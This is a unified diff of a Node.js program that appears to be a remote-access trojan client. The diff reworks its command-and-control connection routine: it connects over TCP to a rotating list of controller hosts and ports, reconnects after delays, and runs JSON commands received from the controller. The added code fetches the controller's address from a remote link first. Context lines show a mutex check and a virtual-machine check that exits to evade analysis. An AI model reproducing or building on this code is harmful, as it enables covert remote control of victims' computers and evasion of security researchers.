@@ -577,47 +577,69 @@ function uninstall() {
 }
 
 function connect() {
-  let hostIdx = 0;
-  let portIdx = 0;
+  function startConnect() {
+    let hostIdx = 0;
+    let portIdx = 0;
 
-  function tryConnect() {
-    if (socket) socket.destroy();
-    const host = CONFIG.hosts[hostIdx];
-    const port = CONFIG.ports[portIdx];
-    
-    socket = new net.Socket();
-    socket.setTimeout(10000);
-    
-    socket.connect(port, host, () => {
-      socket.setTimeout(0);
-    });
+    function tryConnect() {
+      if (socket) socket.destroy();
+      const host = CONFIG.hosts[hostIdx];
+      const port = CONFIG.ports[portIdx];
+      
+      socket = new net.Socket();
+      socket.setTimeout(10000);
+      
+      socket.connect(port, host, () => {
+        socket.setTimeout(0);
+      });
 
-    socket.on('data', (data) => {
-      buffer = Buffer.concat([buffer, data]);
-      while (buffer.length >= 4) {
-        const msgLen = buffer.readUInt32LE(0);
-        if (buffer.length < 4 + msgLen) break;
-        const msgData = buffer.slice(4, 4 + msgLen);
-        buffer = buffer.slice(4 + msgLen);
-        try { handleCommand(JSON.parse(msgData.toString('utf8'))); } catch(e) {}
-      }
-    });
+      socket.on('data', (data) => {
+        buffer = Buffer.concat([buffer, data]);
+        while (buffer.length >= 4) {
+          const msgLen = buffer.readUInt32LE(0);
+          if (buffer.length < 4 + msgLen) break;
+          const msgData = buffer.slice(4, 4 + msgLen);
+          buffer = buffer.slice(4 + msgLen);
+          try { handleCommand(JSON.parse(msgData.toString('utf8'))); } catch(e) {}
+        }
+      });
 
-    socket.on('close', () => {
-      portIdx = (portIdx + 1) % CONFIG.ports.length;
-      if (portIdx === 0) hostIdx = (hostIdx + 1) % CONFIG.hosts.length;
-      reconnectTimer = setTimeout(tryConnect, CONFIG.sleepTime * 1000);
-    });
+      socket.on('close', () => {
+        portIdx = (portIdx + 1) % CONFIG.ports.length;
+        if (portIdx === 0) hostIdx = (hostIdx + 1) % CONFIG.hosts.length;
+        reconnectTimer = setTimeout(tryConnect, CONFIG.sleepTime * 1000);
+      });
 
-    socket.on('error', () => {
-      socket.destroy();
-    });
+      socket.on('error', () => {
+        socket.destroy();
+      });
 
-    socket.on('timeout', () => {
-      socket.destroy();
-    });
+      socket.on('timeout', () => {
+        socket.destroy();
+      });
+    }
+    tryConnect();
   }
-  tryConnect();
+
+  if (CONFIG.ipByLink && CONFIG.ipLink) {
+    try {
+      const protocol = CONFIG.ipLink.startsWith('https') ? https : http;
+      protocol.get(CONFIG.ipLink, (res) => {
+        let content = '';
+        res.on('data', chunk => content += chunk);
+        res.on('end', () => {
+          const match = content.trim().match(/^([^:]+)(?::(\d+))?$/);
+          if (match) {
+            CONFIG.hosts = [match[1]];
+            if (match[2]) CONFIG.ports = [parseInt(match[2])];
+          }
+          startConnect();
+        });
+      }).on('error', startConnect);
+    } catch(e) { startConnect(); }
+  } else {
+    startConnect();
+  }
 }
 
 if (!checkMutex() || checkVM()) process.exit(0);
